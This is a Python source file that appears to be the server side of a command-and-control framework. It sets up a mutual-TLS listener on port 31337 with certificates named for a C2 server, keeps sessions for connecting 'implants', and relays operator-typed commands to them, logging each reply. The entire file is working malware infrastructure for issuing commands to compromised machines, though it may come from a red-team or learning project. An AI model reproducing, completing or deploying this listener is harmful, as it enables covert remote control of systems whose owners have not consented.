#!/usr/bin/env python3

import logging
import socket
import ssl
import threading
import uuid


# A thread safe dict of sessions and their ids
class Sessions:
    def __init__(self):
        self._mutex = threading.Lock()
        self._sessions = dict()

    # Add a connection and an address
    def add(self, conn, addr) -> str:
        # TODO: make sure the id doesn't already exist in the _sessions dict
        self._mutex.acquire()
        id = str(uuid.uuid4())
        self._sessions[id] = (conn, addr)
        self._mutex.release()
        return id

    # Get the connection by the session ID
    def get(self, id):
        self._mutex.acquire()
        conn, addr = self._sessions[id]
        self._mutex.release()
        return (conn, addr)

    # Return a list of session IDs
    def list(self) -> list:
        self._mutex.acquire()
        ids = list(self._sessions.keys())
        self._mutex.release()
        return ids


class Listener:
    def __init__(self):
        self.sessions = Sessions()

        certfile = "../certs/server/avocado-server.c2.pem"
        keyfile = "../certs/server/avocado-server.c2-key.pem"
        client_cert = "../certs/client/rootCA.pem"

        # mTLS settings
        ctx = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        ctx.verify_mode = ssl.CERT_REQUIRED
        ctx.load_cert_chain(certfile, keyfile)
        ctx.load_verify_locations(cafile=client_cert)
        # ctx.post_handshake_auth = True

        # Create a secure socket wrapped in mTLS
        ssock = self.mkssock(ctx)
        # start accepting connections
        threading.Thread(target=self.accept, args=(ssock,)).start()

    # Create a secure socket
    def mkssock(self, ctx: ssl.SSLContext) -> ssl.SSLSocket:
        # Create a TCP socket
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind(("127.0.0.1", 31337))
            s.listen()
            return ctx.wrap_socket(s, server_side=True)

    # Accept connections from implants
    def accept(self, ssock: ssl.SSLSocket):
        while True:
            conn, addr = ssock.accept()
            # conn.verify_client_post_handshake()
            id = self.sessions.add(conn, addr)
            
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            logging.info(f"Accepted connection from {addr} | {id}")
            # TODO: remove this print statement, send this to the log
            #print(f"Accepted connection from {addr} | {id}")


# Send data to implant
def session(conn: ssl.SSLContext):
    while True:
        userin = input("> ")
        if userin == "exit":
            break

        conn.sendall(userin.encode("utf-8"))
        data = conn.recv(1024)
        if not data:
            break
        else:
            logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
            logging.info(data.decode("utf-8"))
            print(data.decode("utf-8"))
